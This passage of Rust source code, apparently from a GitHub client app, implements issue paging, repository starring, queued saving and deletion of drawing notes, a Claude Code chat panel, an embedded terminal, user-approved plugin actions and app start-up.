        let mut orgs: Vec<String> = self.data.repos.iter().map(|r| r.owner.clone()).filter(|o| !o.eq_ignore_ascii_case(&login)).collect();
        orgs.sort_by_key(|o| o.to_lowercase());
        orgs.dedup_by(|a, b| a.eq_ignore_ascii_case(b));
        let next_page = self.issues_page + 1;
        self.loading_more_issues = true;
        let epoch = self.load_gen;
        net::spawn(h, move || async move {
            github::load_more_issues(&cfg, &login, &orgs, next_page).await
        }, move |s: &mut App, r| {
            if s.load_gen != epoch {
                return;
            }
            s.loading_more_issues = false;
            match r {
                Ok((items, total)) => {
                    s.issues_page = next_page;
                    s.data.issues_total = Some(total);
                    for issue in items {
                        if !s.data.issues.iter().any(|existing| existing.number == issue.number && existing.repo.eq_ignore_ascii_case(&issue.repo)) {
                            s.data.issues.push(issue);
                        }
                    }
                    s.data.issues.sort_by_key(|i| std::cmp::Reverse(i.created_at));
                    s.sync_tray();
                }
                Err(e) => {
                    s.notify_problem(format!("Could not load more issues: {e}"));
                }
            }
        });
    }

    /// Stars or unstars repository `i`: on GitHub when a token is configured, locally otherwise.
    fn toggle_star(&mut self, i: usize) {
        if !self.cfg.allow_writes {
            self.notify_problem("Writes are disabled on this server (set REPOHUB_ALLOW_WRITES=true).");
            return;
        }
        let Some(r) = self.data.repos.get_mut(i) else { return };
        let on = !r.starred;
        r.starred = on;
        r.stars = if on { r.stars + 1 } else { r.stars.saturating_sub(1) };
        if !self.cfg.live() || self.cfg.token.is_none() {
            if self.cfg.live() {
                self.notify("Star changed here only: GITHUB_TOKEN is needed to save it on GitHub.");
            }
            return;
        }
        if let Some(h) = self.handle.clone() {
            let (cfg, full) = (self.cfg.clone(), r.full_name.clone());
            let key = full.clone();
            let epoch = self.load_gen;
            net::spawn(h, move || async move { github::set_star(&cfg, &full, on).await }, move |s: &mut App, res| {
                if s.load_gen != epoch {
                    return;
                }
                if let Err(e) = res {
                    if let Some(r) = s.data.repos.iter_mut().find(|r| r.full_name == key) {
                        r.starred = !on;
                        r.stars = if on { r.stars.saturating_sub(1) } else { r.stars + 1 };
                    }
                    s.notify_problem(format!("Couldn't change the star: {e}"));
                }
            });
        }
    }

    /// The branch the Notes tab shows for repository `i`: the one picked, else the default branch.
    fn notes_branch(&self, i: usize) -> Option<(String, String)> {
        let r = self.data.repos.get(i)?;
        let b = self.branch_of.get(&r.full_name).cloned().unwrap_or_else(|| r.branch.clone());
        Some((r.full_name.clone(), b))
    }

    fn apply_notes(&mut self, epoch: u64, key: (String, String), r: Result<Vec<notes::Note>, String>) {
        if epoch != self.load_gen {
            return;
        }
        let v = self.notes.entry(key).or_default();
        match r {
            Ok(items) => {
                v.items = items;
                v.state = Refresh::Fresh;
            }
            Err(e) => v.state = Refresh::Failed(e),
        }
    }

    /// Loads the branch list (once) and the drawings of the selected branch.
    fn load_notes(&mut self, i: usize) {
        if !self.cfg.notes {
            return;
        }
        let Some((full, branch)) = self.notes_branch(i) else { return };
        let Some(h) = self.handle.clone() else { return };
        let epoch = self.load_gen;
        self.load_branches(i, false);
        let k = (full.clone(), branch.clone());
        self.notes.entry(k.clone()).or_default().state = Refresh::Loading;
        net::spawn(h, move || async move { notes::list(&full, &branch).await }, move |s: &mut App, r| {
            s.apply_notes(epoch, k, r);
        });
    }

    /// The Notes tab's branch chips: the same branch as the Code tab.
    fn pick_branch(&mut self, i: usize, branch: String) {
        self.set_branch(i, branch);
        self.load_notes(i);
    }

    fn delete_note(&mut self, i: usize, name: String) {
        let Some((full, branch)) = self.notes_branch(i) else { return };
        self.confirm_delete = None;
        let id = (full, branch, name);
        // Deleting wins over any write still waiting; an operation already running finishes
        // first, then the delete runs, so the drawing can't come back.
        if self.saving_notes.contains_key(&id) {
            self.pending_note_saves.insert(id, NoteOp::Delete);
            self.notify("Deleting the drawing once its last save finishes");
            return;
        }
        self.pending_note_saves.remove(&id);
        self.run_note_delete(id);
    }

    /// Deletes drawing `id`. Like a write, it counts as the drawing's running operation until it
    /// finishes, so nothing else for the same drawing runs alongside it.
    fn run_note_delete(&mut self, id: (String, String, String)) {
        #[cfg(test)]
        self.note_log.push(format!("delete {}", id.2));
        let Some(h) = self.handle.clone() else { return };
        self.saving_notes.insert(id.clone(), NoteOp::Delete);
        let (full, branch, name) = id.clone();
        let epoch = self.load_gen;
        net::spawn(h, move || async move { notes::delete(&full, &branch, &name).await }, move |s: &mut App, r| {
            s.apply_note_op(epoch, id, r);
        });
    }

    /// Opens drawing `name` of repository `i` (on the selected branch) in the board editor.
    fn apply_board_load(&mut self, epoch: u64, board_epoch: u64, id: (String, String, String), r: Result<Option<String>, String>) {
        if self.load_gen != epoch || self.board_load_gen != board_epoch {
            return;
        }
        let Some(b) = self.board.as_mut() else { return };
        if (b.repo.as_str(), b.branch.as_str(), b.name.as_str()) != (id.0.as_str(), id.1.as_str(), id.2.as_str()) {
            return;
        }
        if b.save != Save::Loading {
            return;
        }
        let loaded = match r {
            Ok(Some(json)) => b.load_json(&json),
            Ok(None) => Ok(()),
            Err(e) => Err(e),
        };
        b.save.loaded(loaded);
    }

    /// Opens drawing `name` of repository `i` (on the selected branch) in the board editor.
    fn open_board(&mut self, i: usize, name: String, new: bool) {
        let Some((full, branch)) = self.notes_branch(i) else { return };
        self.board_load_gen = self.board_load_gen.wrapping_add(1);
        let board_epoch = self.board_load_gen;
        let id = (full.clone(), branch.clone(), name.clone());
        let mut b = board::Board::new(&full, &branch, &name);
        // The newest content of this drawing may not be on disk yet: a snapshot waiting behind a
        // running write, or the one being written. Open from it, never from the older file.
        let queued = match self.pending_note_saves.remove(&id) {
            Some(NoteOp::Save(json)) => Some(json),
            Some(NoteOp::Delete) => {
                self.notify("Opened again, so the drawing won't be deleted");
                None
            }
            None => None,
        };
        let running = self.saving_notes.get(&id).cloned();
        let newest = queued.clone().or_else(|| match &running {
            Some(NoteOp::Save(json)) => Some(json.clone()),
            _ => None,
        });
        if let Some(json) = newest {
            let _ = b.load_json(&json);
            if running.is_some() {
                // An operation is running: a queued snapshot is written after it (dirty);
                // otherwise what's on screen is what's being written.
                b.save = Save::Saving { dirty: queued.is_some() };
                self.board = Some(b);
            } else {
                b.save = Save::Saving { dirty: false };
                self.board = Some(b);
                self.write_board();
            }
            return;
        }
        if running == Some(NoteOp::Delete) {
            // Being deleted: it opens empty, and what's drawn now is written once the delete ends.
            self.board = Some(b);
            return;
        }
        if new {
            self.board = Some(b);
            return;
        }
        b.save = Save::Loading;
        self.board = Some(b);
        let Some(h) = self.handle.clone() else { return };
        let epoch = self.load_gen;
        net::spawn(h, move || async move { notes::load(&full, &branch, &name).await }, move |s: &mut App, r| {
            s.apply_board_load(epoch, board_epoch, id, r);
        });
    }

    /// The open drawing changed: write it, or queue the write behind the one that is running
    /// (see [`Save`]). One write runs at a time, so an older one can't land after a newer one.
    fn save_board(&mut self) {
        let Some(b) = self.board.as_mut() else { return };
        let id = (b.repo.clone(), b.branch.clone(), b.name.clone());
        let in_flight = self.saving_notes.contains_key(&id);
        let start = b.save.edit();
        if in_flight {
            if start || matches!(b.save, Save::Saving { .. }) {
                b.save = Save::Saving { dirty: true };
            }
        } else if start {
            self.write_board();
        }
    }

    fn write_board(&mut self) {
        let Some(b) = self.board.as_ref() else { return };
        let id = (b.repo.clone(), b.branch.clone(), b.name.clone());
        let json = b.to_json();
        self.write_note(id, json);
    }

    fn write_note(&mut self, id: (String, String, String), json: String) {
        #[cfg(test)]
        self.note_log.push(format!("save {}: {}", id.2, json.len()));
        let Some(h) = self.handle.clone() else { return };
        self.saving_notes.insert(id.clone(), NoteOp::Save(json.clone()));
        let (repo, branch, name) = (id.0.clone(), id.1.clone(), id.2.clone());
        let epoch = self.load_gen;
        net::spawn(h, move || async move { notes::save(&repo, &branch, &name, json).await }, move |s: &mut App, r| {
            s.apply_note_op(epoch, id, r);
        });
    }

    /// A drawing's running operation (a write or a delete) finished.
    fn apply_note_op(&mut self, epoch: u64, id: (String, String, String), r: Result<(), String>) {
        let done = self.saving_notes.remove(&id);
        // What waits behind it runs whatever happened meanwhile (even an account switch): it's
        // the user's newest content, or their delete.
        match self.pending_note_saves.remove(&id) {
            Some(NoteOp::Save(next_json)) => {
                if let Some(b) = self.board.as_mut().filter(|b| board_is(b, &id)) {
                    b.save = Save::Saving { dirty: false };
                }
                self.write_note(id, next_json);
                return;
            }
            Some(NoteOp::Delete) => {
                self.run_note_delete(id);
                return;
            }
            None => {}
        }
        let open = self.board.as_ref().is_some_and(|b| board_is(b, &id));
        if done == Some(NoteOp::Delete) {
            // Drawn on while it was being deleted: write that now.
            if open && self.board.as_ref().is_some_and(|b| matches!(b.save, Save::Saving { dirty: true })) {
                if let Some(b) = self.board.as_mut() {
                    b.save = Save::Saving { dirty: false };
                }
                self.write_board();
            }
            if self.load_gen == epoch {
                match &r {
                    Ok(()) => self.notify("Drawing deleted"),
                    Err(e) => self.notify_problem(e.clone()),
                }
                if let Some(curr) = self.repo_index_of(&id.0) {
                    self.load_notes(curr);
                }
            }
            return;
        }
        if self.load_gen != epoch {
            return;
        }
        // The open drawing shows the result itself (Saved, or Failed with its message); a toast
        // is for a drawing that's no longer on screen.
        if open {
            if let Some(b) = self.board.as_mut()
                && b.save.written(r)
            {
                self.write_board();
            }
            return;
        }
        if let Err(e) = r {
            self.notify_problem(format!("The last change to the drawing wasn't saved: {e}"));
        }
    }

    /// Before the editor goes away: edits still waiting behind a running write (or after a failed
    /// one) are written now. Never starts a parallel write if one is already running.
    fn flush_board(&mut self) {
        let Some(b) = self.board.as_ref() else { return };
        if !b.save.pending() {
            return;
        }
        let id = (b.repo.clone(), b.branch.clone(), b.name.clone());
        let json = b.to_json();
        if self.saving_notes.contains_key(&id) {
            self.pending_note_saves.insert(id, NoteOp::Save(json));
        } else {
            self.write_note(id, json);
        }
    }

    /// Closes the editor and refreshes the list it came from.
    fn close_board(&mut self, i: usize) {
        let full = self.data.repos.get(i).map(|r| r.full_name.clone());
        self.flush_board();
        self.board = None;
        if let Some(full) = full
            && let Some(curr) = self.repo_index_of(&full)
        {
            self.load_notes(curr);
        }
    }

    /// Sends `prompt` to Claude Code in repository `i`'s local clone, continuing its conversation.
    #[cfg(not(target_arch = "wasm32"))]
    fn ask_claude(&mut self, i: usize, prompt: String) {
        let prompt = prompt.trim().to_owned();
        let Some(r) = self.data.repos.get(i) else { return };
        let full = r.full_name.clone();
        let Some(dir) = clones_shim::find(&full) else { return };
        let Some(h) = self.handle.clone() else { return };
        let chat = self.chats.entry(full.clone()).or_default();
        if prompt.is_empty() || chat.run.is_busy() {
            return;
        }
        chat.items.push(claude::Item::User(prompt.clone()));
        chat.run = claude::Run::Starting;
        chat.run_id += 1;
        let run = chat.run_id;
        let (h2, f2) = (h.clone(), full.clone());
        let started = claude::start(
            &dir,
            &prompt,
            self.claude_mode,
            chat.session.as_deref(),
            move |e| {
                let full = full.clone();
                h.update(move |s: &mut App, _| {
                    if let Some(c) = s.chats.get_mut(&full).filter(|c| c.run_id == run) {
                        c.apply(e);
                    }
                });
            },
            move |problem| {
                h2.update(move |s: &mut App, _| {
                    if let Some(c) = s.chats.get_mut(&f2).filter(|c| c.run_id == run) {
                        c.finished(problem);
                    }
                });
            },
        );
        match started {
            Ok(p) => {
                chat.proc = Some(p);
                self.claude_prompt.clear();
            }
            Err(e) => chat.finished(Some(e)),
        }
    }

    #[cfg(target_arch = "wasm32")]
    fn ask_claude(&mut self, _: usize, _: String) {}

    /// Stops the answer Claude is writing for repository `i`.
    fn stop_claude(&mut self, i: usize) {
        let Some(c) = self.data.repos.get(i).and_then(|r| self.chats.get_mut(&r.full_name)) else { return };
        if c.run.is_busy() {
            c.run = claude::Run::Stopping;
            #[cfg(not(target_arch = "wasm32"))]
            if let Some(p) = &c.proc {
                p.stop();
            }
        }
    }

    /// Forgets repository `i`'s conversation; the next message starts a new Claude Code session.
    fn new_chat(&mut self, i: usize) {
        if let Some(r) = self.data.repos.get(i) {
            self.chats.remove(&r.full_name);
        }
    }

    /// Starts a shell for repository `i` in `dir` (its clone, or where a clone will go).
    fn start_terminal(&mut self, i: usize, dir: std::path::PathBuf, first: Option<String>) {
        let Some(r) = self.data.repos.get(i) else { return };
        let full = r.full_name.clone();
        let Some(h) = self.handle.clone() else { return };
        let pending = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
        let on_output = move || {
            if !pending.swap(true, std::sync::atomic::Ordering::SeqCst) {
                let p = pending.clone();
                h.update(move |_: &mut App, _| p.store(false, std::sync::atomic::Ordering::SeqCst));
            }
        };
        let (rows, cols) = self.term_grid;
        let term_token = if self.cfg.terminal_pass_token { self.cfg.token.as_deref() } else { None };
        match terminal::Term::spawn(&dir, rows, cols, term_token, on_output) {
            Ok(mut t) => {
                if let Some(cmd) = first {
                    t.write(cmd.as_bytes());
                }
                self.terms.insert(full, t);
                self.term_error = None;
            }
            Err(e) => self.term_error = Some(e),
        }
    }

    /// Opens plugin `p`'s section on repository `i`'s page.
    fn open_plugin_tab(&mut self, i: usize, p: Option<String>) {
        let Some(p) = p else { return };
        let Some(r) = self.data.repos.get(i) else { return };
        let full = r.full_name.clone();
        if !matches!(&self.page, Page::Repo(f) if f.eq_ignore_ascii_case(&full)) {
            self.go(Page::Repo(full));
        }
        self.leave_tab();
        self.plugin_tab = Some(p);
    }

    /// A plugin asks to open a link or to copy text. Nothing happens until the user answers;
    /// while one request waits, others are dropped, so a plugin can't bury it or nag.
    #[cfg_attr(target_arch = "wasm32", allow(dead_code))]
    pub(crate) fn plugin_asks(&mut self, request: plugins::Request) {
        if self.plugin_ask.is_none() {
            self.plugin_ask = Some(request);
        }
    }

    /// The user's answer to [`App::plugin_asks`].
    fn answer_plugin(&mut self, allow: bool, tx: &mut Tx) {
        let Some(request) = self.plugin_ask.take() else { return };
        if !allow {
            return;
        }
        match request.ask {
            plugins::Ask::Open(url) => {
                let _ = tx.open_url(&url);
            }
            plugins::Ask::Copy(text) => {
                tx.copy(text);
                self.notify("Copied");
            }
        }
    }

    /// Installs the plugin typed in Settings (a folder or a Git address) and starts it.
    #[cfg(not(target_arch = "wasm32"))]
    fn install_plugin(&mut self, example: bool) {
        if self.plugin_installing {
            return;
        }
        if example {
            self.plugin_installed(plugins::create_example(), true);
            return;
        }
        // Cloning can take a while, or never answer: not on the UI thread.
        let source = self.plugin_src.text.clone();
        match self.handle.clone() {
            Some(h) => {
                self.plugin_installing = true;
                self.plugin_error = None;
                net::spawn(h, move || async move { plugins::install(&source) }, |s: &mut App, r| s.plugin_installed(r, false));
            }
            None => self.plugin_installed(plugins::install(&source), false),
        }
    }

    /// An install finished: starts the plugin, or says why it isn't one.
    #[cfg(not(target_arch = "wasm32"))]
    fn plugin_installed(&mut self, result: Result<String, String>, example: bool) {
        self.plugin_installing = false;
        match result {
            Ok(id) => {
                self.plugin_error = None;
                self.plugin_src.clear();
                self.plugins.rescan();
                if let Some(h) = self.handle.clone() {
                    self.plugins.start(&h);
                }
                let name = self.plugins.list.iter().find(|p| p.id == id).map(|p| p.manifest.name.clone()).unwrap_or(id);
                self.notify(if example { format!("Created {name} in your plugins folder: edit it and it reloads") } else { format!("Installed {name}") });
            }
            Err(e) => self.plugin_error = Some(e),
        }
    }

    #[cfg(not(target_arch = "wasm32"))]
    fn remove_plugin(&mut self, id: &str) {
        if self.plugin_confirm.as_deref() != Some(id) {
            self.plugin_confirm = Some(id.to_owned());
            return;
        }
        self.plugin_confirm = None;
        if self.plugin_tab.as_deref() == Some(id) {
            self.plugin_tab = None;
        }
        if matches!(&self.page, Page::Plugin(pid) if pid == id) {
            self.settings_section = state::SettingsSection::Plugins;
            self.go(Page::Settings);
        }
        match plugins::remove(id) {
            Ok(()) => {
                self.plugins.list.retain(|p| p.id != id);
                self.notify(format!("Removed {id}"));
            }
            Err(e) => self.plugin_error = Some(e),
        }
    }

    /// Turns the Claude section on or off.
    fn set_claude(&mut self, on: bool) {
        state::trace("claude", &self.assist.claude, &on);
        self.assist.claude = on;
        self.assist.save();
        if !on && self.tab == RepoTab::Claude {
            self.tab = RepoTab::Code;
            self.save_place();
        }
    }

    /// Adds the harness typed in Settings (or `suggested`, a name and command).
    fn add_harness(&mut self, suggested: Option<(&str, &str)>) {
        let (name, cmd) = match suggested {
            Some((n, c)) => (n.to_owned(), c.to_owned()),
            None => (self.harness_name.text.clone(), self.harness_cmd.text.clone()),
        };
        match self.assist.add(&name, &cmd) {
            Ok(()) => {
                self.assist.save();
                self.harness_error = None;
                if suggested.is_none() {
                    self.harness_name.clear();
                    self.harness_cmd.clear();
                }
                self.notify(format!("Added {}", name.trim()));
            }
            Err(e) => self.harness_error = Some(e),
        }
    }

    fn remove_harness(&mut self, n: usize) {
        if let Some(h) = self.assist.remove(n) {
            self.assist.save();
            self.notify(format!("Removed {}", h.name));
        }
    }

    /// Starts harness `n` in repository `i`'s Terminal: typed into the running shell, or as the
    /// first command of a new one in the known clone.
    fn run_harness(&mut self, i: usize, n: usize) {
        let Some(h) = self.assist.harnesses.get(n).cloned() else { return };
        let Some(r) = self.data.repos.get(i) else { return };
        let full = r.full_name.clone();
        self.go(Page::Repo(full));
        self.set_tab(i, RepoTab::Terminal);
        let line = format!("{}\r", h.command);
        let running = self.data.repos.get(i).and_then(|r| self.terms.get(&r.full_name)).is_some_and(|t| t.is_running());
        if running {
            self.term_type(i, &line);
        } else if let Some(dir) = self.data.repos.get(i).and_then(|r| clones_shim::find(&r.full_name)) {
            if let Some(r) = self.data.repos.get(i) {
                self.terms.remove(&r.full_name);
            }
            self.start_terminal(i, dir, Some(line));
        } else {
            self.term_error = Some(format!("Choose the repository's folder below, then start {} again.", h.name));
        }
    }

    /// Opens the terminal in the repository's known clone, if any.
    fn open_terminal(&mut self, i: usize) {
        let Some(r) = self.data.repos.get(i) else { return };
        if self.terms.get(&r.full_name).is_some_and(|t| t.is_running()) {
            return;
        }
        if let Some(dir) = clones_shim::find(&r.full_name) {
            self.start_terminal(i, dir, None);
        }
    }

    /// Uses the folder typed in the field as repository `i`'s clone.
    /// Uses the folder that has the repository's name but isn't known to be its clone: the
    /// user says it is.
    fn use_lookalike(&mut self, i: usize) {
        let Some(full) = self.data.repos.get(i).map(|r| r.full_name.clone()) else { return };
        let Some(dir) = clones_shim::lookalike(&full) else { return };
        match clones_shim::remember(&full, &dir) {
            Ok(()) => {
                self.term_error = None;
                self.notify(format!("Using {} for {full}", dir.display()));
            }
            Err(e) => self.term_error = Some(e),
        }
    }

    fn use_folder(&mut self, i: usize) {
        let Some(r) = self.data.repos.get(i) else { return };
        let full = r.full_name.clone();
        let dir = clones_shim::expand(self.clone_path.text.trim());
        if !dir.is_dir() {
            self.term_error = Some(format!("{} isn't a folder on this computer.", dir.display()));
            return;
        }
        if let Err(e) = clones_shim::remember(&full, &dir) {
            self.term_error = Some(e);
            return;
        }
        self.clone_path.clear();
        self.terms.remove(&full);
        // From the Claude tab the folder is all that's needed; the Terminal tab opens a shell there.
        if self.tab == RepoTab::Terminal {
            self.start_terminal(i, dir, None);
        }
    }

    /// Clones repository `i` into the default folder, in its terminal, and remembers where.
    fn clone_repo(&mut self, i: usize) {
        let Some(r) = self.data.repos.get(i) else { return };
        let (full, name, url) = (r.full_name.clone(), r.name.clone(), r.url.clone());
        let parent = clones_shim::default_parent();
        if let Err(e) = std::fs::create_dir_all(&parent) {
            self.term_error = Some(format!("Couldn't create {}: {e}", parent.display()));
            return;
        }
        let command = match terminal::clone_command(&url, &name) {
            Ok(c) => c,
            Err(e) => {
                self.term_error = Some(e);
                return;
            }
        };
        let _ = clones_shim::remember(&full, &parent.join(&name));
        self.terms.remove(&full);
        // The clone runs in the terminal, so show it.
        if self.tab != RepoTab::Terminal {
            self.set_tab(i, RepoTab::Terminal);
        }
        self.start_terminal(i, parent, Some(command));
    }

    /// Types `text` into repository `i`'s terminal.
    fn term_type(&mut self, i: usize, text: &str) {
        if let Some(t) = self.data.repos.get(i).and_then(|r| self.terms.get_mut(&r.full_name)) {
            t.write(text.as_bytes());
        }
    }

    fn term_type_bytes(&mut self, i: usize, bytes: &[u8]) {
        if let Some(t) = self.data.repos.get(i).and_then(|r| self.terms.get_mut(&r.full_name)) {
            t.write(bytes);
        }
    }

    /// Pastes into the terminal of the repository on screen, when its Terminal tab is open.
    fn paste(&mut self, text: &str) -> bool {
        let Page::Repo(full) = &self.page else { return false };
        if self.tab != RepoTab::Terminal {
            return false;
        }
        match self.terms.get_mut(full) {
            Some(t) => {
                t.paste(text);
                true
            }
            None => false,
        }
    }

    fn starred_count(&self) -> u32 {
        self.data.repos.iter().map(|r| r.stars).sum()
    }
}

fn init() -> App {
    let args = rune::extra_args();
    let arg = |name: &str| args.iter().position(|a| a == name).and_then(|i| args.get(i + 1)).cloned();
    let cfg = Arc::new(Config::load());
    let live = cfg.live();
    let now = net::now();
    let mut s = App {
        sidebar: PaneState::new(248.0).range(180.0, 360.0),
        page: Page::Overview,
        filter: RepoFilter::All,
        owner: OwnerFilter::All,
        orgs_closed: false,
        pins: prefs::load_pins(),
        pending_place: None,
        save_places: false,
        saved_layout: None,
        tab: RepoTab::Code,
        pr_filter: PullState::Open,
        search: TextEdit::new(""),
        theme: prefs::load_theme().unwrap_or(cfg.theme),
        plugins: plugins::Plugins::scan(),
        plugin_tab: None,
        plugin_src: TextEdit::new(""),
        plugin_error: None,
        plugin_installing: false,
        plugin_ask: None,
        plugin_confirm: None,
        plugin_ctx_key: 0,
        shown_dark: std::cell::Cell::new(false),
        assist: harness::Assistants::load(),
        harness_name: TextEdit::new(""),
        harness_cmd: TextEdit::new(""),
        harness_error: None,
        looks: themes::Looks::load(),
        look_edit: LookEditor::default(),
        backdrop_size: [1180.0, 760.0],
        images: None,
        sort: RepoSort::Recent,
        toast_id: 0,
        pinned_open: true,
        toast: None,
        // The web build waits for repohub-server's config.json before choosing (see `start`).
        data: if live || cfg!(target_arch = "wasm32") { Data::default() } else { Data::sample_at(now) },
        details: HashMap::new(),
        local: HashMap::new(),
        local_dir: String::new(),
        local_file: None,
        files_from_github: false,
        diff: rune_kit::diff::DiffState::new(Vec::new()),
        diff_of: None,
        diff_load: None,
        pull_diff: rune_kit::diff::DiffState::new(Vec::new()),
        pull_diff_of: None,
        pull_diff_load: None,
        changes: None,
        commit_msg: TextEdit::new(""),
        git_job: None,
        git_error: None,
        merge_method: 0,
        merge_preview: None,
        status: if live || cfg!(target_arch = "wasm32") { Status::Starting } else { Status::Sample },
        load_gen: 0,
        handle: None,
        branches: HashMap::new(),
        branch_of: HashMap::new(),
        picker: None,
        branch_filter: TextEdit::new(""),
        form: None,
        confirm_merge: None,
        settings_section: state::SettingsSection::Account,
        connection_details: false,
        reopening: Vec::new(),
        inbox: None,
        inbox_busy: std::collections::HashSet::new(),
        pull_filter: filters::ListFilter::default(),
        issue_filter: filters::ListFilter::default(),
        thread: None,
        thread_epoch: 0,
        busy: std::collections::HashSet::new(),
        form_title: None,
        pull_meta: None,
        notes: HashMap::new(),
        note_name: TextEdit::new(""),
        confirm_delete: None,
        board_load_gen: 0,
        saving_notes: HashMap::new(),
        #[cfg(test)]
        note_log: Vec::new(),
        pending_note_saves: HashMap::new(),
        board: None,
        chats: HashMap::new(),
        claude_prompt: TextEdit::new(""),
        claude_mode: claude::Mode::Plan,
        terms: HashMap::new(),
        term_cell: [7.8, 17.0],
        term_grid: (24, 100),
        clone_path: TextEdit::new(""),
        acct_user: TextEdit::new(cfg.user.clone().unwrap_or_default()),
        acct_token: TextEdit::new(""),
        acct_error: None,
        term_error: None,
        compact: starts_compact(),
        open_pulls_page: 1,
        closed_pulls_page: 1,
        issues_page: 1,
        loading_more_pulls: false,
        loading_more_issues: false,
        #[cfg(not(target_arch = "wasm32"))]
        tray: None,
        tray_menu: Vec::new(),
        palette: None,
        retry_after: None,
        update: update::Update::initial(),
        #[cfg(not(target_arch = "wasm32"))]
        update_cancel: None,
        update_later: false,
        show_notes: false,
        update_checked: None,
        loaded_at: None,
        last_load: None,
        now,
        clock: 0.0,
        tick_at: 0.0,
        load_clock: None,
        loaded_clock: None,
        cfg,
    };
    // `REPOHUB_BLOCKING=1` loads synchronously before the first frame (headless snapshots).
    #[cfg(not(target_arch = "wasm32"))]
    if live && std::env::var("REPOHUB_BLOCKING").is_ok_and(|v| v == "1") {
        s.set_status(Status::Loading);
        let r = pollster::block_on(github::load_all(&s.cfg));
        let epoch = s.load_gen;
        s.apply(epoch, r);
        if let Some(i) = arg("page").filter(|p| p == "repo").map(|_| 0)
            && let Some(r) = s.data.repos.get(i)
        {
            let full = r.full_name.clone();
            let at = s.data.repos[i].branch.clone();
            s.details.insert((full.clone(), at.clone()), Load::Ready(pollster::block_on(github::load_detail(&s.cfg, &full, &at))));
        }
    }
    // `-- page repos|repo|pulls|issues|actions|settings` opens a page (for headless stills).
    s.page = match arg("page").as_deref() {
        Some("repos") => Page::Repos,
        Some("repo") if !s.data.repos.is_empty() => Page::Repo(s.data.repos[0].full_name.clone()),
        Some("pulls") => Page::Pulls,
        Some("issues") => Page::Issues,
        Some("actions") => Page::Actions,
        Some("notifications") => Page::Notifications,
        Some("settings") => Page::Settings,
        _ => Page::Overview,
    };
    if s.data.sample && matches!(s.page, Page::Repo(_)) {
        s.load_detail(0);
    }
    // `-- tab notes` (a name or a number) picks the repository page's section.
    if let Some(t) = arg("tab").and_then(|t| RepoTab::parse(&t)) {
        s.tab = t;
    }
    // `-- thread 14` opens the conversation of that pull request or issue (for headless stills).
    if let Some(number) = arg("thread").and_then(|n| n.parse::<u32>().ok()) {
        if let Some(repo) = s.data.pulls.iter().find(|p| p.number == number).map(|p| p.repo.clone()) {
            s.open_thread(&repo, number, true);
        } else if let Some(repo) = s.data.issues.iter().find(|x| x.number == number).map(|x| x.repo.clone()) {
            s.open_thread(&repo, number, false);
        }
    }
    // `-- board Name` opens a drawing of that section (for headless stills); `zoom 2` zooms it.
    #[cfg(not(target_arch = "wasm32"))]
    if let Some(name) = arg("board")
        && matches!(s.page, Page::Repo(_))
        && let Some((full, branch)) = s.notes_branch(0)
    {
        let mut b = board::Board::new(&full, &branch, &name);
        if let Ok(Some(json)) = pollster::block_on(notes::load(&full, &branch, &name)) {
            let _ = b.load_json(&json);
        }
        b.tool = board::Tool::Pen;
        b.view.zoom = arg("zoom").and_then(|z| z.parse().ok()).unwrap_or(0.0);
        s.tab = RepoTab::Notes;
        s.board = Some(b);
    }
    // The arrangement and the place of last time; a page on the command line (scripts) wins.
    if let Some(l) = prefs::get("layout").as_ref().and_then(state::Layout::from_json) {
        s.sidebar.set_width(l.sidebar_width);
        s.sidebar.set_open(l.sidebar_open);
        s.sort = l.sort;
        s.owner = l.owner.clone();
        s.saved_layout = Some(l);
    }
    // The sample data has no places of its own to go back to.
    if arg("page").is_none() && !s.data.sample {
        s.pending_place = prefs::get("place").as_ref().and_then(state::Place::from_json);
        if !s.data.repos.is_empty() {
            s.restore_place();
        }
    }
    // Nothing waiting to be restored: where you go from now on is saved.
    if s.pending_place.is_none() {
        s.save_places = true;
    }
    if let Some(q) = arg("search") {
        s.search = TextEdit::new(q);
    }
    s
}

/// GitHub-like palette seeds: canvas, ink and the blue accent.
/// What waits behind a drawing's running write: its newest content, or a delete.
#[derive(Clone, Debug, PartialEq, Eq)]
enum NoteOp {
    Save(String),
    Delete,
}

/// Whether `b` is the drawing `id` (repository, branch, name).
fn board_is(b: &board::Board, id: &(String, String, String)) -> bool {
    (b.repo.as_str(), b.branch.as_str(), b.name.as_str()) == (id.0.as_str(), id.1.as_str(), id.2.as_str())
}

/// The theme editor's text fields, for one of your looks (`id` empty: none open).
#[derive(Default)]
pub struct LookEditor {
    id: String,
    name: TextEdit,
    colors: Vec<TextEdit>,
    image: TextEdit,
}

impl LookEditor {
    fn of(t: &themes::Look) -> LookEditor {
        LookEditor {
            id: t.id.clone(),
            name: TextEdit::new(t.name.clone()),
            colors: t.colors.iter().map(|c| TextEdit::new(c.clone())).collect(),
            image: TextEdit::new(t.image.clone()),
        }
    }
}

#[allow(dead_code)]
fn kit(dark: bool) -> Kit {
    let c = |h: &str| rune::color::hex(h).expect("valid colour");
    let mut k = if dark {
        Kit::from_palette(PaletteSeed { bg: c("#0d1117"), fg: c("#e6edf3"), accent: c("#2f81f7") })
    } else {
        Kit::from_palette(PaletteSeed { bg: c("#f6f8fa"), fg: c("#1f2328"), accent: c("#0969da") })
    };
    k.radius.lg = 10.0;
    k
}

fn nav(s: &App, k: &Kit, label: &str, icon: &'static rune::Icon, page: Page, badge: Option<String>) -> El {
    let selected = s.page == page || (page == Page::Repos && matches!(s.page, Page::Repo(_)));
    let target = page.clone();
    // The Repositories row shows every owner again.
    let mut r = SidebarRow::new(label).icon(icon).height(32.0).selected(selected).on_select(move |s: &mut App, _| {
        if target == Page::Repos {
            s.owner = OwnerFilter::All;
        }
        s.go(target.clone())
    });
    if let Some(b) = badge {
        r = r.badge(b);
    }
    r.build(k).key(format!("nav-{label}"))
}

/// The organizations whose repositories are loaded, with how many each, most first.
fn orgs(s: &App) -> Vec<(String, usize)> {
    let me = &s.data.profile.login;
    let mut out: Vec<(String, usize)> = Vec::new();
    for r in s.data.repos.iter().filter(|r| !r.owner.eq_ignore_ascii_case(me)) {
        match out.iter_mut().find(|(o, _)| o.eq_ignore_ascii_case(&r.owner)) {
            Some((_, n)) => *n += 1,
            None => out.push((r.owner.clone(), 1)),
        }
    }
    out.sort_by(|a, b| b.1.cmp(&a.1).then_with(|| a.0.to_lowercase().cmp(&b.0.to_lowercase())));
    out
}

impl App {
    /// Whether repository `i` is in the sidebar's Pinned section.
    fn is_pinned(&self, i: usize) -> bool {
        pinned(self).contains(&i)
    }

    /// Pins or unpins repository `i`. The first change starts from what the sidebar shows, so
    /// the pins it had by default stay.
